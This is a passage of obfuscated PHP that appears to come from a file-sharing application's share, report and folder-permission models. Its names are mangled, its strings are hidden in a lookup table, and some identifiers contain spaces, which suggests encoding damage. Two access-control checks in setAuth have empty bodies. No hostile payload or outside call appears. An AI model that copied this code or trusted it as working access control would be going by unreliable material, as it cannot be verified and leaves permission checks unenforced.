= false) { $¦°ÕÉÊÄ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÕÃšÑĞ‘ = $’§‹š³ == $¦°ÕÉÊÄ[1260] ? 0 : USER_ID; $ıÌÒˆÜú = array($¦°ÕÉÊÄ[418] => $œÚ­Şº–, $¦°ÕÉÊÄ[1630] => $ÕÃšÑĞ‘); if ($œÚ­Şº– == 0) { $ıÌÒˆÜú = array($¦°ÕÉÊÄ[1958] => $òŠ½¸ÇË[$¦°ÕÉÊÄ[1160]], $¦°ÕÉÊÄ[1630] => $ÕÃšÑĞ‘); } if ($ô³å†¤à = $this->where($ıÌÒˆÜú)->find()) { return $ô³å†¤à[$¦°ÕÉÊÄ[488]]; } if ($œÚ­Şº– == 0) { $‡ìâ®ò• = array($¦°ÕÉÊÄ[32] => get_path_this($òŠ½¸ÇË[$¦°ÕÉÊÄ[78]])); } else { $‡ìâ®ò• = Model($¦°ÕÉÊÄ[815])->sourceInfo($œÚ­Şº–); if (!$‡ìâ®ò•) { return !1; } } if (!$òŠ½¸ÇË[$¦°ÕÉÊÄ[1539]]) { $òŠ½¸ÇË[$¦°ÕÉÊÄ[1539]] = $‡ìâ®ò•[$¦°ÕÉÊÄ[32]]; } $¦Øî„†İ = array($¦°ÕÉÊÄ[1630] => $ÕÃšÑĞ‘, $¦°ÕÉÊÄ[418] => $œÚ­Şº–, $¦°ÕÉÊÄ[1539] => $¦°ÕÉÊÄ[12], $¦°ÕÉÊÄ[493] => 0, $¦°ÕÉÊÄ[495] => 0, $¦°ÕÉÊÄ[1160] => $¦°ÕÉÊÄ[12], $¦°ÕÉÊÄ[311] => $¦°ÕÉÊÄ[12], $¦°ÕÉÊÄ[875] => $¦°ÕÉÊÄ[12], $¦°ÕÉÊÄ[1959] => 0, $¦°ÕÉÊÄ[1960] => 0, $¦°ÕÉÊÄ[496] => 0, $¦°ÕÉÊÄ[497] => $¦°ÕÉÊÄ[12], $¦°ÕÉÊÄ[490] => $¦°ÕÉÊÄ[12]); $¿¬¼Áû = explode($¦°ÕÉÊÄ[50], $¦°ÕÉÊÄ[1961]); foreach ($¿¬¼Áû as $ÖãÛ±º) { if (!isset($òŠ½¸ÇË[$ÖãÛ±º])) { continue; } $¦Øî„†İ[$ÖãÛ±º] = $òŠ½¸ÇË[$ÖãÛ±º]; } $øş¦í½æ = $this->add($¦Øî„†İ); $Ú­ï¿‹ = array($¦°ÕÉÊÄ[490] => short_id($øş¦í½æ)); $this->where(array($¦°ÕÉÊÄ[487] => $øş¦í½æ))->save($Ú­ï¿‹); return $øş¦í½æ; } private function _shareAuthSet($Ïãã·Í, $÷šÊï¥Ó) { $³ãİĞä˜ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!is_array($÷šÊï¥Ó)) { return !1; } $ˆìª·™ = Model($³ãİĞä˜[1912]); $ˆìª·™->where(array($³ãİĞä˜[488] => $Ïãã·Í))->delete(); $ìÜÃ•¤¡ = array(); foreach ($÷šÊï¥Ó as $ãÎ¹š£) { $§¿°©ˆß = SourceModel::TYPE_USER; if ($ãÎ¹š£[$³ãİĞä˜[412]] == SourceModel::TYPE_GROUP) { $§¿°©ˆß = SourceModel::TYPE_GROUP; } $ƒßš÷í = array($³ãİĞä˜[488] => $Ïãã·Í, $³ãİĞä˜[412] => $§¿°©ˆß, $³ãİĞä˜[504] => intval($ãÎ¹š£[$³ãİĞä˜[504]]), $³ãİĞä˜[1908] => 0, $³ãİĞä˜[1962] => -1); if ($ãÎ¹š£[$³ãİĞä˜[1908]]) { $ƒßš÷í[$³ãİĞä˜[1908]] = $ãÎ¹š£[$³ãİĞä˜[1908]]; } else { if ($ãÎ¹š£[$³ãİĞä˜[1962]]) { $ƒßš÷í[$³ãİĞä˜[1962]] = $ãÎ¹š£[$³ãİĞä˜[1962]]; } } $ìÜÃ•¤¡[] = $ƒßš÷í; } return $ˆìª·™->addAll($ìÜÃ•¤¡, array(), !0); } public function numViewAdd($œ®ÊüÄ¶) { $‹¾¯ãíÍ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÊÕáñ¡ = array($‹¾¯ãíÍ[487] => $œ®ÊüÄ¶); $this->where($ÊÕáñ¡)->setAdd($‹¾¯ãíÍ[1959]); } public function numDownloadAdd($ØÒÑÌÖø) { $¾İ·Û”Ö =& $_SERVER[¥Ÿ©ÒèÌ]; $çø»™‹Â = array($¾İ·Û”Ö[487] => $ØÒÑÌÖø); $this->where($çø»™‹Â)->setAdd($¾İ·Û”Ö[1960]); } protected function shareEdit($å‹Œù, $çìİÌ¥) { $İşÒØüÒ =& $_SERVER[¥Ÿ©ÒèÌ]; $÷ÌŞçËÃ = $this->getInfo($å‹Œù); if (!$÷ÌŞçËÃ) { return !1; } $this->_checkLinkShare($çìİÌ¥, $÷ÌŞçËÃ); $şÅà¶ = array(); $Ï‚œ†ê¨ = explode($İşÒØüÒ[50], $İşÒØüÒ[1963]); foreach ($Ï‚œ†ê¨ as $†ßÌ»²) { if (!array_key_exists($†ßÌ»², $çìİÌ¥)) { continue; } $şÅà¶[$†ßÌ»²] = $çìİÌ¥[$†ßÌ»²]; } $this->shareEventAdd($÷ÌŞçËÃ[$İşÒØüÒ[403]], $çìİÌ¥, $İşÒØüÒ[1777]); $this->where(array($İşÒØüÒ[487] => $å‹Œù))->save($şÅà¶); if (isset($çìİÌ¥[$İşÒØüÒ[1952]])) { $this->_shareAuthSet($å‹Œù, $çìİÌ¥[$İşÒØüÒ[1952]]); } return !0; } private function _checkLinkShare($ÙÚ³ç¼À, $éÜúşâ”) { $Ù“Ôõƒ„ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ÙÚ³ç¼À[$Ù“Ôõƒ„[493]] != $Ù“Ôõƒ„[89]) { return; } $™¯ÅŞÄï = $éÜúşâ”[$Ù“Ôõƒ„[87]][$Ù“Ôõƒ„[403]]; if ($éÜúşâ”[$Ù“Ôõƒ„[87]][$Ù“Ôõƒ„[33]] != $Ù“Ôõƒ„[192]) { $È­³–šÑ = $this->_folderReport($™¯ÅŞÄï); if (!$È­³–šÑ) { return; } show_json(LNG($Ù“Ôõƒ„[1964]) . $Ù“Ôõƒ„[1965] . $È­³–šÑ, !1); } $­ñö —Î = Model($Ù“Ôõƒ„[815])->fileInfoGet($éÜúşâ”[$Ù“Ôõƒ„[87]][$Ù“Ôõƒ„[403]]); if (!$­ñö —Î) { return; } $õ°Çš”” = $this->shareFileMeta($­ñö —Î[$Ù“Ôõƒ„[467]]); if (isset($õ°Çš””[$Ù“Ôõƒ„[378]]) && $õ°Çš””[$Ù“Ôõƒ„[378]] == $Ù“Ôõƒ„[89]) { show_json(LNG($Ù“Ôõƒ„[1966]), !1); } } private function _folderReport($Úƒ¡¹“) { $ØûÛ¨Ò =& $_SERVER[¥Ÿ©ÒèÌ]; $Â­ÎéúŞ = array($ØûÛ¨Ò[467] => array($ØûÛ¨Ò[998], 0), $ØûÛ¨Ò[740] => 3); $µ¼ùû¾Ï = Model($ØûÛ¨Ò[1967])->where($Â­ÎéúŞ)->field($ØûÛ¨Ò[467])->select(); if (!$µ¼ùû¾Ï) { return !1; } $µ¼ùû¾Ï = array_to_keyvalue($µ¼ùû¾Ï, $ØûÛ¨Ò[12], $ØûÛ¨Ò[467]); $ËŸÇ‰ãö = $ØûÛ¨Ò[50] . $Úƒ¡¹“ . $ØûÛ¨Ò[50]; $Â­ÎéúŞ = array($ØûÛ¨Ò[467] => array($ØûÛ¨Ò[7], $µ¼ùû¾Ï), $ØûÛ¨Ò[521] => array($ØûÛ¨Ò[387], "\45{$ËŸÇ‰ãö}\x25"), $ØûÛ¨Ò[431] => 0); $ƒûì± = Model($ØûÛ¨Ò[815])->where($Â­ÎéúŞ)->field($ØûÛ¨Ò[1968])->find(); if (!$ƒûì±) { return !1; } $Ô¯«äÁ = substr($ƒûì±[$ØûÛ¨Ò[521]], strpos($ƒûì±[$ØûÛ¨Ò[521]], $ËŸÇ‰ãö)); $Â­ÎéúŞ = array($ØûÛ¨Ò[403] => array($ØûÛ¨Ò[7], trim($Ô¯«äÁ, $ØûÛ¨Ò[50]))); $Ñ‹¸Æ®È = Model($ØûÛ¨Ò[815])->where($Â­ÎéúŞ)->field($ØûÛ¨Ò[32])->select(); $……È­Òé = array_to_keyvalue($Ñ‹¸Æ®È, $ØûÛ¨Ò[12], $ØûÛ¨Ò[32]); $……È­Òé[] = $ƒûì±[$ØûÛ¨Ò[32]]; return implode($ØûÛ¨Ò[8], $……È­Òé); } protected function remove($•¥¬üû) { $´“¬†³— =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_array($•¥¬üû)) { $•¥¬üû = array($´“¬†³—[7], $•¥¬üû); } $èÖóô™Ï = array($´“¬†³—[488] => $•¥¬üû); $·Š­€ë× = $this->where($èÖóô™Ï)->delete(); if ($·Š­€ë×) { Model($´“¬†³—[596])->where(array($´“¬†³—[488] => $•¥¬üû))->delete(); } $´õ¤ÃµÌ = is_array($•¥¬üû) ? $•¥¬üû[1] : array($•¥¬üû); for ($È™º¥÷ª = 0; $È™º¥÷ª < count($´õ¤ÃµÌ); $È™º¥÷ª++) { $´˜ÂÀ¦¸ = $this->getInfo($´õ¤ÃµÌ[$È™º¥÷ª]); if ($´˜ÂÀ¦¸[$´“¬†³—[495]] == $´“¬†³—[89]) { Model($´“¬†³—[564])->eventShare($´˜ÂÀ¦¸[$´“¬†³—[403]], $´“¬†³—[1957]); } if ($´˜ÂÀ¦¸[$´“¬†³—[493]] == $´“¬†³—[89]) { Model($´“¬†³—[564])->eventShare($´˜ÂÀ¦¸[$´“¬†³—[403]], $´“¬†³—[1956]); } } return $·Š­€ë×; } protected function removeBySource($•ıİ²Ô®) { $Äî³˜œß =& $_SERVER[¥Ÿ©ÒèÌ]; $¶Ç™âÆ¨ = array($Äî³˜œß[418] => array($Äî³˜œß[419], $•ıİ²Ô®)); $¶ú†ı§ = $this->field($Äî³˜œß[488])->where($¶Ç™âÆ¨)->select(); $¶ú†ı§ = array_to_keyvalue($¶ú†ı§, $Äî³˜œß[12], $Äî³˜œß[488]); if (!$¶ú†ı§) { return; } $¶Ç™âÆ¨ = array($Äî³˜œß[487] => array($Äî³˜œß[419], $¶ú†ı§)); $this->where($¶Ç™âÆ¨)->delete(); Model($Äî³˜œß[596])->where($¶Ç™âÆ¨)->delete(); } public function listAll($µœ«¤äÄ) { $¥ôéÏÌ =& $_SERVER[¥Ÿ©ÒèÌ]; $§ ÂÈú° = array(); if ($µœ«¤äÄ[$¥ôéÏÌ[1639]]) { $§ ÂÈú°[$¥ôéÏÌ[1639]] = $µœ«¤äÄ[$¥ôéÏÌ[1639]]; } if ($µœ«¤äÄ[$¥ôéÏÌ[751]]) { $¿ã¥Ü°Û = $µœ«¤äÄ[$¥ôéÏÌ[496]] ? $µœ«¤äÄ[$¥ôéÏÌ[496]] : strtotime(date($¥ôéÏÌ[1969])); $§ ÂÈú°[$¥ôéÏÌ[193]] = array($¥ôéÏÌ[337], array($µœ«¤äÄ[$¥ôéÏÌ[751]], $¿ã¥Ü°Û)); } if ($µœ«¤äÄ[$¥ôéÏÌ[33]]) { $§ ÂÈú°[$µœ«¤äÄ[$¥ôéÏÌ[33]]] = 1; } else { $§ ÂÈú°[] = array($¥ôéÏÌ[493] => array($¥ôéÏÌ[998], 0), $¥ôéÏÌ[495] => array($¥ôéÏÌ[998], 0), $¥ôéÏÌ[1946] => $¥ôéÏÌ[1902]); } if ($µœ«¤äÄ[$¥ôéÏÌ[1898]]) { $§ ÂÈú°[] = array($¥ôéÏÌ[490] => $µœ«¤äÄ[$¥ôéÏÌ[1898]], $¥ôéÏÌ[1539] => array($¥ôéÏÌ[387], "\x25{$µœ«¤äÄ[$¥ôéÏÌ[1898]]}\45"), $¥ôéÏÌ[1946] => $¥ôéÏÌ[1902]); } $›õö†·´ = $this->_makeOrder()->where($§ ÂÈú°)->selectPage(20); if (empty($›õö†·´[$¥ôéÏÌ[373]])) { return array(); } $this->_listDataApply($›õö†·´[$¥ôéÏÌ[373]]); return $›õö†·´; } public function listDataApply($…œ€½) { $this->_listDataApply($…œ€½); return $…œ€½; } private function _listDataApply(&$òÅ»’¾) { $£ƒ†ä×õ =& $_SERVER[¥Ÿ©ÒèÌ]; $÷èÚŸÈ× = array_to_keyvalue($òÅ»’¾, $£ƒ†ä×õ[12], $£ƒ†ä×õ[1639]); $©Ñ¤Ì×· = Model($£ƒ†ä×õ[538])->userListInfo(array_unique($÷èÚŸÈ×)); $’©ŸşÔÒ = array_to_keyvalue($òÅ»’¾, $£ƒ†ä×õ[12], $£ƒ†ä×õ[403]); $â‹óšÊÅ = Model($£ƒ†ä×õ[815])->sourceListInfo($’©ŸşÔÒ, !0); foreach ($òÅ»’¾ as $êüä­ñ¿ => &$ÜØšŸë±) { $Æû¹»Ôï = $ÜØšŸë±[$£ƒ†ä×õ[1639]]; $ÜØšŸë±[$£ƒ†ä×õ[1970]] = $©Ñ¤Ì×·[$Æû¹»Ôï] ? $©Ñ¤Ì×·[$Æû¹»Ôï] : !1; $ƒó¹—Ñ© = $ÜØšŸë±[$£ƒ†ä×õ[403]]; $ÜØšŸë±[$£ƒ†ä×õ[87]] = $â‹óšÊÅ[$ƒó¹—Ñ©] ? $â‹óšÊÅ[$ƒó¹—Ñ©] : !1; if ($ÜØšŸë±[$£ƒ†ä×õ[87]][$£ƒ†ä×õ[431]] == $£ƒ†ä×õ[89]) { unset($òÅ»’¾[$êüä­ñ¿]); } if ($ÜØšŸë±[$£ƒ†ä×õ[87]] != $£ƒ†ä×õ[190] && !$ÜØšŸë±[$£ƒ†ä×õ[87]]) { unset($òÅ»’¾[$êüä­ñ¿]); } } unset($ÜØšŸë±); $òÅ»’¾ = array_values($òÅ»’¾); } private function _makeOrder($ˆŸ¶£•å = '') { $èÉÕÆ–Ë =& $_SERVER[¥Ÿ©ÒèÌ]; $ååÅ‰Ô• = array($èÉÕÆ–Ë[193], $èÉÕÆ–Ë[496], $èÉÕÆ–Ë[1959], $èÉÕÆ–Ë[1960]); $ËßÚíÇõ = array($èÉÕÆ–Ë[448] => $èÉÕÆ–Ë[449], $èÉÕÆ–Ë[450] => $èÉÕÆ–Ë[451]); $Ş–±ËÁ = Input::get($èÉÕÆ–Ë[455], $èÉÕÆ–Ë[7], $èÉÕÆ–Ë[424], $ååÅ‰Ô•); $Û¤Óé¥ß = Input::get($èÉÕÆ–Ë[456], $èÉÕÆ–Ë[7], $èÉÕÆ–Ë[1971], array($èÉÕÆ–Ë[1897], $èÉÕÆ–Ë[450])); $Û¤Óé¥ß = $ËßÚíÇõ[$Û¤Óé¥ß]; $ˆŸ¶£•å = $ˆŸ¶£•å . "{$Ş–±ËÁ}\x20{$Û¤Óé¥ß}"; return $this->order($ˆŸ¶£•å); } public function reportAdd($°¡šğ‡) { $‹× Òãì =& $_SERVER[¥Ÿ©ÒèÌ]; $ë‡®óóş = array($‹× Òãì[488] => $°¡šğ‡[$‹× Òãì[488]], $‹× Òãì[1639] => USER_ID); if (Model($‹× Òãì[1967])->where($ë‡®óóş)->find()) { return !1; } $ªŞğÍÑ = array($‹× Òãì[488] => $°¡šğ‡[$‹× Òãì[488]], $‹× Òãì[1539] => $°¡šğ‡[$‹× Òãì[1539]], $‹× Òãì[403] => $°¡šğ‡[$‹× Òãì[403]], $‹× Òãì[467] => $°¡šğ‡[$‹× Òãì[467]], $‹× Òãì[1639] => USER_ID, $‹× Òãì[33] => $°¡šğ‡[$‹× Òãì[33]], $‹× Òãì[451] => $°¡šğ‡[$‹× Òãì[451]]); return Model($‹× Òãì[1967])->add($ªŞğÍÑ); } public function reportList($£èœœõ) { $»ãÅ‰öŸ =& $_SERVER[¥Ÿ©ÒèÌ]; $ËÈ¹Íâ = array(); if ($£èœœõ[$»ãÅ‰öŸ[751]]) { $æ£òêŠí = $£èœœõ[$»ãÅ‰öŸ[496]] ? $£èœœõ[$»ãÅ‰öŸ[496]] : strtotime(date($»ãÅ‰öŸ[1969])); $ËÈ¹Íâ[$»ãÅ‰öŸ[193]] = array($»ãÅ‰öŸ[337], array($£èœœõ[$»ãÅ‰öŸ[751]], $æ£òêŠí)); } if (isset($£èœœõ[$»ãÅ‰öŸ[33]]) && in_array($£èœœõ[$»ãÅ‰öŸ[33]], array($»ãÅ‰öŸ[89], $»ãÅ‰öŸ[435], $»ãÅ‰öŸ[1972], $»ãÅ‰öŸ[1973], $»ãÅ‰öŸ[1974]))) { $ËÈ¹Íâ[$»ãÅ‰öŸ[33]] = $£èœœõ[$»ãÅ‰öŸ[33]]; } if (isset($£èœœõ[$»ãÅ‰öŸ[740]]) && in_array($£èœœõ[$»ãÅ‰öŸ[740]], array($»ãÅ‰öŸ[190], $»ãÅ‰öŸ[89], $»ãÅ‰öŸ[435], $»ãÅ‰öŸ[1972]))) { $ËÈ¹Íâ[$»ãÅ‰öŸ[740]] = $£èœœõ[$»ãÅ‰öŸ[740]]; } $Ü¸øÖ„ˆ = Input::get($»ãÅ‰öŸ[456], $»ãÅ‰öŸ[7], $»ãÅ‰öŸ[1971], array($»ãÅ‰öŸ[1897], $»ãÅ‰öŸ[450])); $¬šº¿Ï = array($»ãÅ‰öŸ[448] => $»ãÅ‰öŸ[449], $»ãÅ‰öŸ[450] => $»ãÅ‰öŸ[451]); $íÚë÷¢Ò = $»ãÅ‰öŸ[1975] . $¬šº¿Ï[$Ü¸øÖ„ˆ]; $„¹ÜÅ = Model($»ãÅ‰öŸ[1967])->where($ËÈ¹Íâ)->order($íÚë÷¢Ò)->selectPage(20); if (empty($„¹ÜÅ[$»ãÅ‰öŸ[373]])) { return array(); } $›ô¢Æ“å = array_to_keyvalue_group($„¹ÜÅ[$»ãÅ‰öŸ[373]], $»ãÅ‰öŸ[740], $»ãÅ‰öŸ[488]); if (!empty($›ô¢Æ“å[0])) { $£èœœõ = $›ô¢Æ“å[0]; $ËÈ¹Íâ = array($»ãÅ‰öŸ[488] => array($»ãÅ‰öŸ[7], $£èœœõ)); $¹ ‹‘ùª = $this->where($ËÈ¹Íâ)->field($»ãÅ‰öŸ[488])->select(); $¹ ‹‘ùª = array_to_keyvalue($¹ ‹‘ùª, $»ãÅ‰öŸ[12], $»ãÅ‰öŸ[488]); $”ğ¬³ôÒ = array_diff($£èœœõ, $¹ ‹‘ùª); if (!empty($”ğ¬³ôÒ)) { foreach ($„¹ÜÅ[$»ãÅ‰öŸ[373]] as $öÇø¿äŸ => $±™áÁÎß) { if (in_array($±™áÁÎß[$»ãÅ‰öŸ[488]], $”ğ¬³ôÒ)) { unset($„¹ÜÅ[$»ãÅ‰öŸ[373]][$öÇø¿äŸ]); } } } } $this->_listDataApply($„¹ÜÅ[$»ãÅ‰öŸ[373]]); return $„¹ÜÅ; } public function reportStatus($Êşè­Ò¶) { $Ï ˜ş‡” =& $_SERVER[¥Ÿ©ÒèÌ]; $ç¥µú‡ = array($Ï ˜ş‡”[401] => $Êşè­Ò¶[$Ï ˜ş‡”[401]]); $Œ²ßš®õ = Model($Ï ˜ş‡”[1967])->where($ç¥µú‡)->field($Ï ˜ş‡”[1976])->find(); if (!$Œ²ßš®õ) { return !1; } $Õ¦ä¼îõ = array($Ï ˜ş‡”[740] => $Êşè­Ò¶[$Ï ˜ş‡”[740]]); if ($Êşè­Ò¶[$Ï ˜ş‡”[740]] == $Ï ˜ş‡”[1972] && $Œ²ßš®õ[$Ï ˜ş‡”[740]] == $Ï ˜ş‡”[1972]) { $Õ¦ä¼îõ[$Ï ˜ş‡”[740]] = 0; } $õÏ¬ñÚ– = Model($Ï ˜ş‡”[1967])->where($ç¥µú‡)->save($Õ¦ä¼îõ); if ($Êşè­Ò¶[$Ï ˜ş‡”[740]] == $Ï ˜ş‡”[435]) { if ($Œ²ßš®õ[$Ï ˜ş‡”[467]] != $Ï ˜ş‡”[190] && $this->shareFileMeta($Œ²ßš®õ[$Ï ˜ş‡”[467]])) { $this->shareFileMeta($Œ²ßš®õ[$Ï ˜ş‡”[467]], 0); } $this->remove($Œ²ßš®õ[$Ï ˜ş‡”[488]]); return !0; } if ($õÏ¬ñÚ– && $Êşè­Ò¶[$Ï ˜ş‡”[740]] == $Ï ˜ş‡”[1972]) { $™†Ûâ£ß = $Õ¦ä¼îõ[$Ï ˜ş‡”[740]] == $Ï ˜ş‡”[1972] ? 1 : 0; $this->shareFileMeta($Œ²ßš®õ[$Ï ˜ş‡”[467]], $™†Ûâ£ß); $this->removeByFile($Œ²ßš®õ[$Ï ˜ş‡”[467]]); } return $õÏ¬ñÚ–; } private function removeByFile($Åæ·µÜÅ) { $ó¯‡Úç¤ =& $_SERVER[¥Ÿ©ÒèÌ]; $ççìÀ±é = Model($ó¯‡Úç¤[815])->where(array($ó¯‡Úç¤[467] => $Åæ·µÜÅ))->field($ó¯‡Úç¤[403])->select(); $÷¹­œò = array_to_keyvalue($ççìÀ±é, $ó¯‡Úç¤[12], $ó¯‡Úç¤[403]); $Ù‹ö…Ã = array($ó¯‡Úç¤[403] => array($ó¯‡Úç¤[7], $÷¹­œò), $ó¯‡Úç¤[493] => 1); $ççìÀ±é = $this->where($Ù‹ö…Ã)->field($ó¯‡Úç¤[488])->select(); if (empty($ççìÀ±é)) { return; } $ô¢´ë¨ = array_to_keyvalue($ççìÀ±é, $ó¯‡Úç¤[12], $ó¯‡Úç¤[488]); $this->remove($ô¢´ë¨); } private function shareFileMeta($¨ÇùÇÉ¾, $‹Õúã¥‚ = null) { $Ëæš¼•˜ =& $_SERVER[¥Ÿ©ÒèÌ]; $èùÄùÒŒ = array($Ëæš¼•˜[467] => $¨ÇùÇÉ¾, $Ëæš¼•˜[95] => $Ëæš¼•˜[1977]); if (is_null($‹Õúã¥‚)) { return Model($Ëæš¼•˜[1978])->where($èùÄùÒŒ)->find(); } $èùÄùÒŒ[$Ëæš¼•˜[378]] = $‹Õúã¥‚; Model($Ëæš¼•˜[1978])->add($èùÄùÒŒ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\143\x65\x5f\141\165\164\150"; public function getAuth($Â¯½¸¦Ñ) { $œŸ”ŒØ =& $_SERVER[¥Ÿ©ÒèÌ]; $»¶…Ï = $this->sourceAuthSelect($Â¯½¸¦Ñ); $ñš¥»¬ = array(); $¾åÍ£±ß = array(); $ÄĞ§Ìä³ = 2 << 25; foreach ($»¶…Ï as $ïè¡ªËº) { $Ä­™”ŒÛ = Model($œŸ”ŒØ[507])->listData($ïè¡ªËº[$œŸ”ŒØ[1908]]); if (!$Ä­™”ŒÛ) { continue; } $ñš¥»¬[] = $ïè¡ªËº; $¦ÓÙÓ’¡ = 0; if ($ïè¡ªËº[$œŸ”ŒØ[412]] == SourceModel::TYPE_GROUP) { $¦ÓÙÓ’¡ = $ÄĞ§Ìä³ * 2; } if ($ïè¡ªËº[$œŸ”ŒØ[412]] == SourceModel::TYPE_USER) { $¦ÓÙÓ’¡ = $ÄĞ§Ìä³; } if ($ïè¡ªËº[$œŸ”ŒØ[412]] == SourceModel::TYPE_USER && $ïè¡ªËº[$œŸ”ŒØ[504]] == $œŸ”ŒØ[190]) { $¦ÓÙÓ’¡ = 0; } $¾åÍ£±ß[] = $Ä­™”ŒÛ[$œŸ”ŒØ[414]] + $¦ÓÙÓ’¡; } array_multisort($¾åÍ£±ß, SORT_DESC, $ñš¥»¬); return $ñš¥»¬; } public function sourceAuthSelect($‡†„àö¦) { $©Ô«˜Ş± =& $_SERVER[¥Ÿ©ÒèÌ]; static $ƒÃ›Ş™á = array(); $ƒìÉÒ« = is_array($‡†„àö¦) ? !1 : !0; if ($ƒìÉÒ«) { $‡†„àö¦ = array($‡†„àö¦); } $ûúˆ†Íû = array(); foreach ($‡†„àö¦ as $ÖÎ…öæ) { if (isset($ƒÃ›Ş™á[$ÖÎ…öæ])) { $ûúˆ†Íû[$ÖÎ…öæ] = $ƒÃ›Ş™á[$ÖÎ…öæ]; } } if (count($ûúˆ†Íû) == count($‡†„àö¦)) { return $ƒìÉÒ« ? $ûúˆ†Íû[$‡†„àö¦[0]] : $ûúˆ†Íû; } $öƒŒê©´ = $©Ô«˜Ş±[1979]; $Ã‚¨µÚó = array($©Ô«˜Ş±[403] => array($©Ô«˜Ş±[7], $‡†„àö¦)); $¢‡Ñ•×è = $this->field($öƒŒê©´)->order($©Ô«˜Ş±[401])->where($Ã‚¨µÚó)->select(); $óØ‚èÜ = array_to_keyvalue_group($¢‡Ñ•×è, $©Ô«˜Ş±[403]); foreach ($‡†„àö¦ as $ÖÎ…öæ) { $ƒÃ›Ş™á[$ÖÎ…öæ] = $óØ‚èÜ[$ÖÎ…öæ] ? $óØ‚èÜ[$ÖÎ…öæ] : array(); } if ($ƒìÉÒ«) { return $¢‡Ñ•×è; } return $óØ‚èÜ; } public function setAuth($¸•Šä©ó, $‡Ã¤Üà) { $´™ï–å =& $_SERVER[¥Ÿ©ÒèÌ]; $°‡–Á‰” = Model($´™ï–å[1311])->sourceInfo($¸•Šä©ó); if (!$°‡–Á‰”) { return !1; } if ($°‡–Á‰”[$´™ï–å[412]] != SourceModel::TYPE_GROUP) { return !1; } $Æ®Î§‹à = 1; $Üş¼²›« = $°‡–Á‰”[$´™ï–å[504]]; if ($Üş¼²›« != $Æ®Î§‹à) { $Ì½Ğãøœ = array($´™ï–å[1807] => $Üş¼²›«); $üÉ¶Í·û = Model($´™ï–å[1896])->field($´™ï–å[1639])->where($Ì½Ğãøœ)->select(); $üÉ¶Í·û = array_to_keyvalue($üÉ¶Í·û, $´™ï–å[12], $´™ï–å[1639]); } $Â’Äƒ°Á = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ú´ì’×ì = array(); foreach ($‡Ã¤Üà as $õÔ±´ãÁ) { if (!in_array($õÔ±´ãÁ[$´™ï–å[412]], $Â’Äƒ°Á)) { show_json(LNG($´™ï–å[1980]), !1); } if ($Üş¼²›« != $Æ®Î§‹à) { if ($õÔ±´ãÁ[$´™ï–å[412]] == SourceModel::TYPE_GROUP) { } if ($õÔ±´ãÁ[$´™ï–å[504]] != 0 && !in_array($õÔ±´ãÁ[$´™ï–å[504]], $üÉ¶Í·û)) { } } if ($õÔ±´ãÁ[$´™ï–å[504]] == 0) { $õÔ±´ãÁ[$´™ï–å[412]] = SourceModel::TYPE_USER; } $ú´ì’×ì[] = array($´™ï–å[403] => $¸•Šä©ó, $´™ï–å[412] => intval($õÔ±´ãÁ[$´™ï–å[412]]), $´™ï–å[504] => intval($õÔ±´ãÁ[$´™ï–å[504]]), $´™ï–å[1908] => intval($õÔ±´ãÁ[$´™ï–å[1908]]) ? intval($õÔ±´ãÁ[$´™ï–å[1908]]) : 0, $´™ï–å[1962] => intval($õÔ±´ãÁ[$´™ï–å[1962]]) ? intval($õÔ±´ãÁ[$´™ï–å[1962]]) : -1); } $this->where(array($´™ï–å[418] => $¸•Šä©ó))->delete(); $this->addAll($ú´ì’×ì); return !0; } public function authClear($Ê•Ãœé³) { $÷Ö”Õü =& $_SERVER[¥Ÿ©ÒèÌ]; $™®§„‡‘ = Model($÷Ö”Õü[1311])->sourceInfo($Ê•Ãœé³); $‡‰ÆìÁ = array($Ê•Ãœé³); if ($™®§„‡‘[$÷Ö”Õü[411]] == $÷Ö”Õü[89]) { $“ü¾Çòæ = array($÷Ö”Õü[584] => array($÷Ö”Õü[544], $™®§„‡‘[$÷Ö”Õü[521]] . $Ê•Ãœé³ . $÷Ö”Õü[545])); $‡‰ÆìÁ = Model($÷Ö”Õü[1311])->field($÷Ö”Õü[418])->where($“ü¾Çòæ)->getField($÷Ö”Õü[403], !0); $‡‰ÆìÁ[] = $Ê•Ãœé³; } $this->where(array($÷Ö”Õü[418] => array($÷Ö”Õü[419], $‡‰ÆìÁ)))->delete(); return !0; } public function getAllChildren($‹¯…şòİ) { $çÓ‹Š³½ =& $_SERVER[¥Ÿ©ÒèÌ]; $Û™¥ø« = Model($çÓ‹Š³½[1311])->sourceInfo($‹¯…şòİ); if ($Û™¥ø«[$çÓ‹Š³½[411]] != $çÓ‹Š³½[89]) { return $this->sourceListAuth(array($‹¯…şòİ)); } if ($Û™¥ø«[$çÓ‹Š³½[412]] != SourceModel::TYPE_GROUP) { return array(); } $«ØĞ“Î¬ = 1; $ ›ïë€ = array($‹¯…şòİ); if ($Û™¥ø«[$çÓ‹Š³½[498]] == $çÓ‹Š³½[190] && $Û™¥ø«[$çÓ‹Š³½[504]] != $«ØĞ“Î¬) { $ ›ïë€ = $this->groupChidldAllRootSource($Û™¥ø«[$çÓ‹Š³½[504]]); } $ÒúÌïĞİ = $this->field($çÓ‹Š³½[403])->group($çÓ‹Š³½[403])->select(); $ÒúÌïĞİ = array_to_keyvalue($ÒúÌïĞİ, $çÓ‹Š³½[12], $çÓ‹Š³½[403]); if (!$ÒúÌïĞİ) { return array(); } $ŒÍ¨°ç« = $çÓ‹Š³½[1981]; $ã×„õï = array($çÓ‹Š³½[403] => array($çÓ‹Š³½[7], $ÒúÌïĞİ), $çÓ‹Š³½[431] => $çÓ‹Š³½[190]); $Ú¡ß¦è = Model($çÓ‹Š³½[815])->field($ŒÍ¨°ç«)->where($ã×„õï)->select(); $…Æƒ– = array($‹¯…şòİ); foreach ($Ú¡ß¦è as $À±Š—°é) { foreach ($ ›ïë€ as $åŒ¤ü‘) { $Ãğ ŸˆÔ = $çÓ‹Š³½[50] . $åŒ¤ü‘ . $çÓ‹Š³½[50]; $ıïÒúÓê = $À±Š—°é[$çÓ‹Š³½[521]] . $À±Š—°é[$çÓ‹Š³½[403]] . $çÓ‹Š³½[50]; if (strstr($ıïÒúÓê, $Ãğ ŸˆÔ)) { $…Æƒ–[] = $À±Š—°é[$çÓ‹Š³½[403]]; break; } } } return 